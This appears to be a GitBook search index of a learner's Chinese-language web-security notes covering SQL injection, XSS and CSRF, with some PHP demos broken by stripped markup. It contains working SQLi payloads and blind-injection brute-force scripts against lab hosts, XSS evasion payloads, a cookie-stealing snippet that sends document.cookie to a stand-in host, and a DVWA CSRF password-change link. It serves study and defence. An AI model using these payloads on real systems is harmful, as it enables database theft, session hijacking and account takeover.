{"./":{"url":"./","title":"简介","keywords":"","body":"简介 Suffering is the teacher of life. 病了很久，也颓废了很久，感觉自己现在陷入了舒适区，每天的生活不断重复，但是丝毫看不到自己的成长。每当想要开始学习，提升自己的时候，却总学不进去，然后过不久又进入了舒适区。感觉现在自己的自控力近乎于无，真是要命。 这几天也是下定决心要走出舒适区，要开始学习了，浪费了那么多时间，要学习的东西挺多的，慢慢来吧。 我考虑了挺久才决定拿gitbook来记录我今后的学习笔记，编写我的知识库。我看了下其他软件，不是说不行，都挺方便的，但是就是他们数据在本地没有存储，有点不太放心，所以最后选了gitbook，折腾了一下。这知识库以后大部分应该都是WEB安全相关的内容，可能也会有其他的内容。 这也算我一个新的开始吧，告别过去，生活总要向前看的，人生还很长，不能颓一辈子。 最后，身体健康真是个好东西，希望大家都健健康康 啊哈，tm又玩了半年，时间真是哗哗的就过去了 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2022-06-15 16:13:08 "},"web常见漏洞原理及利用/":{"url":"web常见漏洞原理及利用/","title":"Web常见漏洞原理及利用","keywords":"","body":"Web常见漏洞原理及利用 这一部分是我学习Web常见漏洞的学习笔记，记录常见漏洞原理及相关利用方法 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-05-25 16:16:02 "},"web常见漏洞原理及利用/SQL注入漏洞.html":{"url":"web常见漏洞原理及利用/SQL注入漏洞.html","title":"SQL注入漏洞","keywords":"","body":"SQL注入漏洞 漏洞原理 服务端在与数据库进行交互时，使用了字符串拼接的方式构造SQL语句，并且服务端没有对用户提交的参数进行严格的过滤，导致用户可以将SQL语句插入到可控参数中，改变原有的SQL语义结构，从而达到攻击者所预期的结果。 例如： 开发者使用下面的SQL拼接语句来向数据库查询数据 $sql = \"select id, username from user where id = $id\"; 其中$id是用户可控的参数，如果用户传入1 union select 1,database() limit 1,1 ,那么拼接后的SQL语义结构就会被改变，变成： select id, username from user where id = 1 union select 1,database() limit 1,1 当脚本向数据库请求数据时，就会执行这被改变的SQL语句，从而达到攻击者预期的效果 漏洞危害 获取数据（脱裤） 读取敏感系统文件 写入WEBSHELL 命令执行 修改信息 等等 漏洞利用 MYSQL的相关知识点 在进行利用前，先了解下MYSQL与SQL注入相关的知识点，后面SQL注入利用都是基于MYSQL的。 information_schema库 MYSQL在5.0版本后，默认会在数据库中存放一个叫\"information_schema\"的数据库。这个数据库保存了MYSQL中所有数据库的信息，数据库名、数据库的表名、数据库中的表的列名以及访问权限等。 这里需要知道的表有三个: SCHEMATA、TABLES和COLUMNS 其中SCHEMATA表中的SCHEMA_NAME记录了所有数据库的名字 TABLES表中的TABLE_SCHEMA和TABLE_NAME两个字段分别记录了数据库的库名和表名。 COLUMNS表中存储该用户创建的所有数据库的库名、表名和字段名，TABLE_SCHEMA记录了库名、TABLE_NAME记录了表名、COLUMN_NAME记录了字段名。 MYSQL的查询语句 不知道任何条件时 select column_name from schema_name.table_name; 其中column_name是要查询的字段名，schema_name是库名，table_name是表名 知道一条已知条件时 select column_name from schema_name.table_name where column_name1='some_value'; 其中column_name1是已知条件的字段名 知道两条已知条件时 select column_name from schema_name.table_name where column_name1 = 'some_value' and column_name2 = 'some_value'; 常用函数 database() ： 返回当前数据库名 user() ：返回MYSQL当前用户名 version() ：返回MYSQL的版本 concat() ：联合数据，用于联合两条数据结果。concat(userid,0x3a,username) group_concat() ：和concat()类似，用于将多条数据一次注入出来 hex()和unhex() ：用于hex编码和解码 load_file() ：以文本方式读取文件 注释 行间注释：--+ 和 # select * from user; --+ or select * from user;# 行内注释：/*注释内容*/和 /*! MYSQL专属*/ 其中MYSQL专属的内联注释可以用于整个SQL语句中，其中的SQL代码也会被执行。 select table_schema,table_name,column_name from columns /! union / select 1,2,3; limit limit会返回前面几条或者中间几条数据 select * from user limit m,n 其m指记录从0开始的第m+1条记录， n指从第m+1条开始取n条记录 文件导入导出的相关操作 mysql常用的写入写出文件的函数有： into dumpfile() into outfile() load_file() 读写文件函数的限制： 涉及在服务器上写入或读取文件，上面的函数能否执行成功受到secure_file_priv这个参数的影响 secure_file_priv参数的意义： secure_file_priv=null 不允许文件的导入导出 secure_file_priv=xxx 只允许在这个目录中执行文件的导入和导出操作，这个目录必须存在，MYSQL不会创建它 secure_file_priv=/ 可以导入导出文件到任意位置 这个参数可以通过select @@secure_file_priv语句查询，而且这个参数不能动态更改，只能在配置文件中更改，然后重启生效 通过load_file()函数读取文件： demo： select load_file(\"c:\\boot.ini\") select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92, 114,101,112,97,105,114,92,115,97,109))) char(99,58,47,98,111,111,116,46,105,110,105)就是c:/boot.ini的ascii码 load_file()函数会读取文件并返回该文件的内容作为一个字符串 使用条件： 必须有权限进行读写并且文件必须完全可读 必须指定文件的完整路径 读取文件的大小必须小于max_allowed_packet 导出数据： 这里有两个函数可以用于导出数据，into outfile()和 into dumpfile() select .. into outfile select .. int dumpfile 其中outfile函数可以导出多行，而dumpfile只能导出一行数据。outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。同时outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。 demo： # into outfile select version() into outfile \"c:\\\\phpstduy_pro\\\\www\\\\test.php\" #into dumpfile select * from test into dumpfile '/tmp/test.txt' 常规注入步骤 demo: sql.php ID： ID：$id\"; echo \"无此记录\"; } else { $row = mysqli_fetch_row($res); echo \"ID：$id\"; echo \"Username：${row[1]}\"; } mysqli_close($conn); ?> 这里以这个demo为例子，来过一遍常规注入步骤 常规注入步骤： 爆字段数 这里利用order by来判断字段数 id = 1 order by ? 这里通过替换问号为从1开始的数字，一个个去测试，直到某个数字n报错，那么列数就为n-1 这里n为3时就报错了，说明表中的字段数为2 判断回显的字段 id = 0 union select 1,2; 这里通过id=0让前面的查询不会有结果，然后使用union来联合查询。 这里显示的位子是2号位，而且只有一个字段会显示。 爆数据库名 id = 0 union select 1,database(); 这里爆出来的数据库名为vul 爆表名 在information_schema库中查询该数据库所拥有的表 id = 0 union select 1, group_concat(table_name) from information_schema.tables where table_schema = database(); 这里显示出两个表：users和test 爆列名 根据爆出来的表名，在information_schema.columns中查询表中的字段 id = 0 union select 1, group_concat(column_name) from information_schema.columns where table_name= 'users'; 因为users表原本在MYSQL中就存在的，它包含用户的名称，和连接数目，而我创建的users表包含的字段有: id,username,userpasswd，可以发现已经被爆出来了 爆列的内容 id=0 union select 1,group_concat(username,0x3a,userpasswd) from users 漏洞分类 type注入利用 按照注入点的数据类型来对SQL注入进行分类，一共有三种类型： 整型注入 SQL原型：SELECT * FROM news WHERE id=1; 其中可控参数id是整数类型，在web端显示大概如下： http://www.xxx.com/index.php?id=1 这类型的注入一般按常规注入流程来就行了。 字符型注入 SQL原型：SELECT * FROM news WHERE author='admin'; 其中可控参数author是字符类型，在web端的显示大概如下： http://www.xxx.com/index.php?name=admin 这类型的注入一般都要先闭合引号，单引号就闭合单引号，双引号就闭合双引号，同时在构造的SQL语句后加注释符将后面的引号注释掉。 搜索型注入 SQL原型：SELECT * FROM news WHERE title like '%xxx%'; 其中可控参数是xxx，这个SQL语句会寻找title中包含xxx的数据。 如果用户输入：news' and 1=1 and '%= SQL查询语句就会变成: SELECT * FROM news WHERE title like '%news' and 1=1 and'%=%'; 所以存在SQL注入漏洞，利用时记得闭合引号和百分号。 按照效果注入利用 联合注入 联合注入就是利用union来进行注入。 union用于合并两个select的结果集，它必须满足几个条件。 union必须由两条或者两条以上的select语句组成，语句之间使用union链接 union中的每个select语句必须具有相同的列、表达式或者聚合函数，它们的出现顺序可以不一致 列的数据类型必须兼容，兼容的含义是数据库可以隐含的转换它们的类型 NULL可以转换为每种常用数据类型，在不确定数据类型时可以时用NULL来探测字段数量 这类注入一般要先利用order by语句爆出列的数量。 基于布尔的盲注 SQL查询的数据内容不会回显到页面上，页面回显只能判断true or false。 这里构造SQL判断语句，通过页面的回显来推测那些SQL判断条件成立，以此来获取数据库的内容。 用到的MYSQL函数: length() ：返回字符串长度 substr(str,m,n) ：返回字符串str从第m位开始的n个字符 ascii() ： 返回字符的ascii码 demo: boolean.php ID： you are not in!\"; } else { echo \"Your are in!\"; } mysqli_close($conn); ?> 判断数据库名长度 payload: ?id=0 or length(database()) >1 这里id=0是为了让前面的select语句查询结果为空，通过替换>后的数字不断进行尝试 可以发现在数字变成3时，页面回显变成了\"you are not in\"，说明数据库名长度为3 脚本： import requests def brute_len(sqls): url = \"http://192.168.45.139/select1.php\" for i in range(100): s = sqls.format(str(i)) parm = {\"id\": s} r = requests.get(url, parm) if \"you are not in!\" in r.text: print(\"len is\",str(i)) return else: continue brute_len(\"0 or length(database())>{0}\") 爆破数据库名 这里介绍两种方法，一种是遍历法，一种是二分法 遍历法 通过遍历可视字符来猜解内容 脚本： import requests def brute_con(sqls,len): url = \"http://192.168.45.139/select1.php\" # chars = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;?@[]^_{|}~\" name = '' for i in range(1,len+1): for c in chars: s = sqls.format(str(i),c) parm = {\"id\":s} r = requests.get(url,parm) if \"Your are in!\" in r.text: name += c print(c,end=\"\") break else: continue return name brute_con(\"0 or substr(database(),{0},1) = '{1}'\",3) 二分法 可视字符的ascii值范围大概在0x20~0x7f之间。 这里通过将字符转为ascii码，然后再进行比较，利用二分搜索的思路，可以很快将内容爆破出来 例如：0 or ascii(substr(database(),1,1)) 思路： 首先取mid值，构造SQL判断语句，如果返回为true，则结束搜索 如果目标元素ascii值小于mid，则令right=mid，然后在新的区间重复1 如果目标元素ascii值大于mid，则令left=mid，然后在新的区间重复1 脚本: ```python def binary(sql,length): url = \"http://192.168.45.139/select1.php\" for i in range(1,length+1): left = 0x1f right = 0x7f while 1: mid = left+(right-left)//2 if(mid == left): print(chr(mid),end=\"\") break sqls = sql.format(str(i) ,mid) #print(sqls) param = {\"id\":sqls} r = requests.get(url,param) if \"Your are in!\" in r.text: right = mid else: left = mid binary( \"0 or ascii(substr(database(),{0},1)) 爆破表名长度 这里用之前的那个爆破长度的脚本，替换payload语句就可以了 payload: \"0 or length((select table_name from information_schema.tables where table_schema = database() limit 0,1)) > {0}\" \"0 or length((select table_name from information_schema.tables where table_schema = database() limit 1,1)) > {0}\" 这里因为我的数据库有两个表，所以用limit来选择不同的表名 两个表长度分别为4和9 爆破表名 这里用遍历法或者二分法都可以，我都试了，这里只写遍历法的。 payload： \"0 or substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),{0},1) = '{1}'\" \"0 or substr((select table_name from information_schema.tables where table_schema = database() limit 1,1),{0},1) = '{1}'\" 爆破表中列名的长度 payload: 0 or length((select group_concat(column_name) from information_schema.columns where table_name = 'user_info' limit {0},1)) > {1} 爆破列名 payload: \"0 or substr((select group_concat(column_name) from information_schema.columns where table_name = 'user_info' limit 0,1),{0},1) = '{1}'\" 爆破列的内容 先爆破内容的长度 payload： \"0 or length((select group_concat(id,username,0x3a,userpasswd) from user_info)) > {0}\" 然后再爆破内容： payload: \"0 or substr((select group_concat(id,username,0x3a,userpasswd) from user_info),{0},1) = '{1}'\" 基于时间的盲注 SQL查询的数据不会回显页面上，同时页面也不能判断语句是否执行成功。 具体原理：当对数据库进行查询操作时，如果查询的条件不存在，语句执行的时间就是0，利用这一特性，通过时间延时来判断查询是否存在，一般利用sleep函数或者benchmark函数来进行延时。 例如： select * from user_info where id = $id and if(length(database())>3,sleep(5),1) 上面的sql语句中，当数据库名大于3时就会进行延时5秒的操作，反则if会直接返回1，并且与前面的逻辑与拼接。通常响应的时间应该再0-1s之内，通过这个可以很容易分辨出判断语句的结果。 demo:select2.php ID： yes ok\"; } else { echo \"yes ok\"; } mysqli_close($conn); ?> 判断数据库长度 ?id = 1 and if(length(database())>2,0,sleep(5)) 数据库名爆破 这里我用的是遍历法 payload: ?id=1 and if(substr(database(),{0},1)='{1}',sleep(5),0) 脚本: import requests def brute_con(strs,length): url = \"http://192.168.45.152/select2.php\" chr_list = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&()*+,-./:;?@[]^_{|}~\" content = '' for i in range(1,length+1): for c in chr_list: sqls = strs.format(str(i),c) param = {\"id\":sqls} try: r = requests.get(url,param,timeout=6) if r.text != \"\": continue except: print(c,end=\"\") content += c break brute_con(\"1 and if(substr(database(),{0},1)='{1}',sleep(6),0)\",3) 剩下的步骤和布尔注入类似 获取表名 payload: ?id = 1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)='{1}' ,sleep(6),0) 获取列名: payload: ?id = 1 and if(substr((select group_concat(column_name) from information_schema.columns where table_name='user_info'),{0},1)='{1}',sleep(6),0) 获取数据 payload: ?id =1 and if(substr((select group_concat(username,0x3a,userpasswd,0x3a) from user_info),{0},1)='{1}',sleep(6),0) 报错注入 页面会返回MYSQL的报错信息，可以将想要得到的数据通过报错信息带出。这种注入的利用方式与MYSQL的版本有很大的关联。 xpath语法报错 两个函数: updatexml()和extractvalue() 这两个函数都是对XML文档进行查询和修改的函数，函数语法： updatexml(XML_document, XPath_string, new_value) extractvalue(xml_frag, xpath_expr) 报错原理：这两个函数的第二个参数必须是正确的xpath语法，不然就会报错。 适用版本：5.1.5+ 常见payload： select updatexml(1,concat(0x7e,(select user()),0x7e),1) select extractvalue(1,concat(0x7e,(select user()),0x7e)) 列名重复报错 在MYSQL中，列名重复会导致报错，而name_const函数可以用来制造一个列，所以可以利用这个函数来进行报错。 name_const()语法： name_const(name,value) name是指定的列名，而value是给定的值 payload： select * from (select name_const(version(),1),name_const(version(),1))as a; 这个报错限制比较大，高版本修复了这个漏洞，name必须为常量，不可以是变量。 只有在 低版本中（Mysql 5.0.12 一般配合join爆破列名： mysql> select from (select from user_info a join user_info b )c; ERROR 1060 (42S21): Duplicate column name 'id' mysql> select from (select from user_info a join user_info b using(id)) c; ERROR 1060 (42S21): Duplicate column name 'username' mysql> select from (select from user_info a join user_info b using(id,username)) c; ERROR 1060 (42S21): Duplicate column name 'userpasswd' 主键重复报错 这里利用的floor()、count()和group by来造成主键重复报错。这个报错对MYSQL版本没什么要求，比较通用。 常见payload: select count() from users group by concat(version(),floor(rand(0) 2)); 具体原理参考：https://xz.aliyun.com/t/7169#toc-22 通用payload: select 1 from (select count(*),concat(0x7e,(database()),0x7e),floor(rand(0)*2))a from information_schema.tables group by a )b 这里以sqli-lab中的less-5做例子： 爆数据库名 ?id=1' and (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand()*2))a from information_schema.tables group by a) b)--+ 查询表名 ?id=1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e,floor(rand()*2))a from information_schema.tables group by a) b)--+ 因为这个报错输出字符有长度限制，所以使用limit控制输出字符的长度 查询列名 ?id=1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e,floor(rand()*2))a from information_schema.tables group by a) b)--+ 查询列的内容 ?id=1' and (select 1 from (select count(*),concat((select concat(username,':',password) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); --+ 数据溢出报错 MYSQL的int型数据范围: | Type | Storage | Minimum Value | Maximum Value | | --------- | ------- | -------------------- | -------------------- | | | (Bytes) | (Signed/Unsigned) | (Signed/Unsigned) | | TINYINT | 1 | -128 | 127 | | | | 0 | 255 | | SMALLINT | 2 | -32768 | 32767 | | | | 0 | 65535 | | MEDIUMINT | 3 | -8388608 | 8388607 | | | | 0 | 16777215 | | INT | 4 | -2147483648 | 2147483647 | | | | 0 | 4294967295 | | BIGINT | 8 | -9223372036854775808 | 9223372036854775807 | | | | 0 | 18446744073709551615 | 双精度溢出报错 exp()函数是以e为底的指数函数，当传递的数字大于709时，就会产生溢出报错。 payload: select exp(~(select * from (select database())a) ~表示按位取反，而当一个语句查询成功后会返回0，0按位取反后的值为 18446744073709551615 ，从而造成溢出。 这里利用对MYSQL版本有限制，适用版本： 5.5.53~5.5.49 与exp()有相同效果的函数还有 pow()和cot() payload: select pow(8,~(select * from (select database())a)) select cot((select * from (select database())a)) 整型溢出 原理：当一个查询语句查询成功后会返会一个0，这个值可以用来进行数学运算。所以可以利用这个值来进行逻辑非运算来获得1，然后和~0相加就会造成整形溢出。 mysql> select ~0+1; ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)' mysql> select !(select * from (select database())a); +---------------------------------------+ | !(select * from (select database())a) | +---------------------------------------+ | 1 | +---------------------------------------+ 1 row in set (0.00 sec) mysql> select ~0+!(select * from (select database())a); ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + (not((select 'vul' from dual))))' 几何函数报错 几何函数对参数格式要求很严格，格式是类似(0 0, 10 10, 20 25, 50 60)这样的几何数据，如果参数格式出错就会报错。 常见函数: GeometryCollection GeometryCollection((select * from (select* from(select user())a)b)) polygon polygon((select * from (select * from (select database())a)b)) multipoint multilinestring linestring multipolygon 这些函数的用法都类似，后面的payload就不写了。 MYSQL版本: 5.5.48 堆叠注入 使用分号(;)来结束上一条SQL语句,然后分号后继续构造下一条SQL语句. 堆叠注入可以执行任意的SQL语句 , 例如insert into和delete. 宽字节注入 宽字节注入利用了PHP脚本编码和MYSQL数据库编码设置不同产生的问题来进行注入 demo: query(\"set names gbk;\"); $id = $_GET['id']; $id = addslashes($id); $sql = \"select * from user_info where id='$id'\"; $res = mysqli_query($conn,$sql); echo \"\".$sql.\"\".\"\"; echo mysqli_error($conn); ?> addslashes函数对输入的id进行转义，如果输入包括 '、\"和\\这些字符，那么就会在这些字符前加反斜杠。 例如： 但是，如果输入id为%df%27的话，就会产生报错。因为mysql数据库使用gbk编码，它认为两个字节代表一个字符，所以addslashes函数插入的 反斜杠会和%df 在一起被当成一个汉字綅，从而使单引号逃逸出来了。 常见绕过方式 AND/OR过滤绕过 大小写变形 oR、OR、Or 双写绕过 aandnd, oorr 使用&& 和 || 代替，(&& 要进行URL编码) 直接用等号=拼接 ?id=1=updatexml(1,concat((select user())),1) 使用^拼接 空格过滤绕过 使用/**/绕过过滤空格 不使用空格 1'||updatexml(1,concat(0x7e,version()),1) 多层括号嵌套 特殊字符替代空格 %09a TAB键 水平 %0a 新建一行 %0c 新的一页 %0d return 功能 %0b tab键 垂直 %a0 空格 使用+号代替 and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略 逗号过滤绕过 使用join语句代替连接 ?id=1 union select * from (select username from user_info)a join (select password from user_info)b limit使用offset代替逗号 limit 1 offset 1 substr(data from 1 for 1) == substr(data,1,1) 等于号过滤绕过 like替代 ?id=1 and if(mid(user(),1,,1) like 'r%',1,0) regexp替代 ?id=1 and if(mid(user(),1,2) regexp '[o]',1,0) 要注意的是MYSQL的正则不区分大小写,如果要区分的话,要在regexp后加 binary关键字 如: regexp binary '[o]' rlike替代 ?id= 1 and if(mid(user()),1,2) rlike '[ro]' ,1,0) between...and...替代 ?id = 1 and if(mid(user(),1,1) between 'r' and 'r' ,1,0) 括号过滤绕过 order by 大小比较盲注 单引号绕过 测试是否存在编码问题 不需要跳过单引号的情况:字符串可以用十六进制表示,也可以通过进制函数转换成其他函数 数字过滤绕过 from: MySQL注入技巧 代替字符 数 代替字符 数、字 代替字符 数、字 false、!pi() 0 ceil(pi()*pi()) 10\\ A ceil((pi()+pi())*pi()) 20\\ K true、!(!pi()) 1 ceil(pi()*pi())+true 11\\ B ceil(ceil(pi())*version()) 21\\ L true+true 2 ceil(pi()+pi()+version()) 12\\ C ceil(pi()*ceil(pi()+pi())) 22\\ M floor(pi())、~~pi() 3 floor(pi()*pi()+pi()) 13\\ D ceil((pi()+ceil(pi()))*pi()) 23\\ N ceil(pi()) 4 ceil(pi()*pi()+pi()) 14\\ E ceil(pi())*ceil(version()) 24\\ O floor(version()) //注意版本 5 ceil(pi()*pi()+version()) 15\\ F floor(pi()*(version()+pi())) 25\\ P ceil(version()) 6 floor(pi()*version()) 16\\ G floor(version()*version()) 26\\ Q ceil(pi()+pi()) 7 ceil(pi()*version()) 17\\ H ceil(version()*version()) 27\\ R floor(version()+pi()) 8 ceil(pi()*version())+true 18\\ I ceil(pi()pi()pi()-pi()) 28\\ S floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19\\ J floor(pi()pi()floor(pi())) 29\\ T information关键字绕过 对应代码将information过滤了,无法使用information_tables和information_columns这两个表来获取表名和列名. 在MYSQL5.6以上的版本,在系统MYSQL库中存在两张与innodb相关的表 : innodb_table_status innodb_index_status 可以通过这两张表来替代information_tables 和 information_columns 寻找注入点 GET请求注入 提交数据的方式是GET请求,注入点的参数位于GET参数部分. 例如: http://www.demo/com/index.php?id=1 POST请求注入 提交数据的方式是POST请求, 注入点位于POST数据内,通常发生在表单中 Cookie注入 注入点的参数位于cookie中 http头注入 注入点位于HTTP请求头部中的某个字段, 例如User-Agent字段中 常见的http注入的参数: HTTP_CLIENT_IP ‘HTTP_X_FORWARDED_FOR’, ‘HTTP_X_FORWARDED’, ‘HTTP_X_CLUSTER_CLIENT_IP’, ‘HTTP_FORWARDED_FOR’, ‘HTTP_FORWARDED’, ‘REMOTE_ADDR User-agent Referer X-Forwarded-For SQL注入防御 SQL语句预编译和绑定变量 设置好数据库用户的权限 使用严格的过滤 str_replace()替换过滤 addslashes()函数,添加转义字符 过滤常见危险字符串 htmlspecialchars()函数实体化过滤 REFERENCE https://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/ https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484372&idx=1&sn=ffcc51a88c9acf96c312421b75fc2a26&chksm=ec1e33fcdb69baea53838fd545a236c0deb8a42f3b341ee0879c9e4ac9427c2147fab95b6669#rd https://xz.aliyun.com/t/7169#toc-19 https://xz.aliyun.com/t/5505#toc-1 https://xz.aliyun.com/t/1719 https://xz.aliyun.com/t/7318#toc-6 https://xz.aliyun.com/t/3992#toc-2 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2022-06-17 19:37:33 "},"web常见漏洞原理及利用/XSS漏洞.html":{"url":"web常见漏洞原理及利用/XSS漏洞.html","title":"XSS漏洞","keywords":"","body":"XSS漏洞原理及利用 XSS概述 跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。 XSS原理 反射型XSS 反射型XSS也叫非持久型XSS，最常见的就是在URL中构造，将恶意连接发送给目标用户。当用户访问该链接时，会向服务器发起一个GET请求来提交带有恶意代码的链接。 DVWA中的demo: '; echo 'Hello ' . $_GET['name']; echo ''; } 存储型XSS 存储型XSS也叫持久型XSS，常见存在与博客的留言板、反馈投诉、论坛评论等地方，它会将恶意代码和正文都存储进服务器。用户每次访问页面都会触发恶意代码。 demo: ' . mysql_error() . '' ); } ?> DOM型XSS DOM型XSS也是反射型的一种，不过比较特殊。它不会和服务器发生交互，它通过修改页面的DOM节点来形成XSS漏洞。我们可以通js脚本DOM进行编辑从而修改页面的元素。也就是说，客户端的脚本可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。 demo: var img=document.createElement(\"img\"); img.src=\"http://demo.com/cookie?\"+escape(document.cookie); XSS危害 Cookie盗取 服务器端脚本： #http://demo.com/xss_cookie.php 在存在XSS漏洞的地方插入下面的代码: var img = document.createElement(\"img\"); img.src = \"http://demo.com/xss_cookie.php?cookie=\"+escape(document.cookie); 钓鱼（伪造登录框页面） 获取内网IP段 参考这篇文章 https://toutiao.io/posts/8urlis/preview 站点重定向 获取客户端页面信息 XSS蠕虫 漏洞挖掘 基本思路 漏洞挖掘的方法大致可以分成两类： 人工挖掘 利用工具自动化挖掘 利用工具自动化挖掘本质就是将人工挖掘的流程自动化，流程还是差不多的。 一般流程： 寻找数据入口 潜在注入点检测 生成payload payload攻击验证 寻找数据入口就是寻找WEB页面上的输入和输出口。例如网站输入框、URL参数，评论、留言版、或者Header头部里的UA/Referer/Cookie等。潜在注入点检测就是判断输入点是否可以成功将数据注入到页面。生成payload就是不断测试去调整payload，用payload进行不断的fuzz。当payload成功注入时，就意味着XSS注入成功了。 常用的探测向量 alert(1) confirm(1) Awesome payloads z [confirm``]\"z z /*\"/ondblclick=`z click click \"/onload=confirm()// --!> (((confirm)))`` (_=prompt,_(1)) \"\"> \" src=//15.rs> x 一些速查表： Cross-site scripting (XSS) cheat sheet xss-payload-list XSS Filter Evasion Cheat Sheet Awesome XSS Polyglot XSS Polyglot也可以说是XSS通用攻击payload吧，它由不同语言的元素构成，能注入多种不同的上下文。 一个例子：from: https://github.com/s0md3v/AwesomeXSS#awesome-polyglots %0ajavascript:`/*\\\"/*-->&lt;svg onload='/*` 解释： 常见的绕过方法 闭合标签：“>alert(1); 利用html标签的属性值： 空格/tab/回车: 字符编码：%c1;alert(1);// 圆括号过滤： 实体解码 使用 十六进制、八进制、Unicode、HTML等进行编码 Alert被过滤：使用prompt和confirm代替 漏洞防御 参照： https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html 最后推荐两个xss闯关网址： http://xss-quiz.int21h.jp/ https://www.xssgame.com/m4KKGHi2rVUN 等我有空就去玩一下 REFERENCE https://github.com/s0md3v/AwesomeXSS https://github.com/hongriSec/Web-Security-Attack/blob/master/Part1/Day2/files/README.md https://github.com/payloadbox/xss-payload-list https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://thief.one/2017/05/31/1/ https://zhuanlan.zhihu.com/p/26086290 https://www.jianshu.com/p/13f0b9a15e46 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-05-25 15:42:21 "},"web常见漏洞原理及利用/CSRF漏洞.html":{"url":"web常见漏洞原理及利用/CSRF漏洞.html","title":"CSRF漏洞","keywords":"","body":"CSRF漏洞 CSRF原理 CSRF( Cross Site Request Forgery)也就是跨站请求伪造。对于 CSRF来说，其两个关键点是跨站与请求伪造，跨站的意思很好理解，也就是跨域名访问，具体指的是运行在浏览器中的某个URL下的脚本读取另一个域名在当前浏览器的存储数据，例如cookie。请求伪造就伪造成受害用户向服务器发送操作请求，执行用户非预期的操作。一般流程是攻击者诱导受害者访问第三方网站，然后第三方网站向被攻击的网站发送跨站请求。利用受害者在被攻击网站获取的登录凭证，绕过后台的校验，从而达到冒充受害用户对被攻击网站执行某项操作的目的。 一个典型的CSRF攻击流程如下： 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。 a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 a.com以受害者的名义执行了act=xx。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。 CSRF类型 CSRF基本可以分为GET型、POST型和链接型 GET型的CSRF GET类型的CSRF很简单，就是一个HTTP请求，一般形式如下：（这是dvwa靶场的csrf例子） 只要受害者访问含有这个img标签的网页，浏览器就会自动向dvwa服务器发送修改密码的请求。 POST型的CSRF POST型的CSRF一般是利用隐藏起来的可以自动提交的表单，如： document.forms[0].submit(); 链接型的CSRF 链接型的CSRF需要受害者点击恶意链接才能触发，一般是在图片中嵌入恶意链接 DVWA上的CSRF low ' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> low这一关很简单，它参数都通过GET请求获取，它修改密码的功能仅检查用户两次输入的密码是否一致，如果相同就直接修改用户密码，没有进行额外的检查，所以存在CSRF漏洞。一般payload如下： http://192.168.134.136:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change# 任何用户访问这条链接都会将密码设置为test，但是一般用户都不会那么傻，访问这个明显看起来不对劲的链接 所以可以通过短链接进行隐藏，短链接会将用户连接转换为http://t.hk.uy/zMt的形式，不过要有自己的域名，我没有就不试了。 也可以通过下面的形式进行利用 test 受害用户访问这个网页会自动向服务请发送请求，修改密码 medium ' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } } else { // Didn't come from a trusted source echo \"That request didn't look correct.\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?> medium等级添加了对请求来源的检查stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ])!=-1， 其中 $_SERVER[ 'HTTP_REFERER' ]是链接到当前页面的前一页面的地址，$_SERVER[ 'SERVER_NAME' ]是服务器的主机名，一般是域名。stripos函数用于判断子串是否在字符串中出现，并没有判断它出现的位置，所以绕过方法有很多，如下： 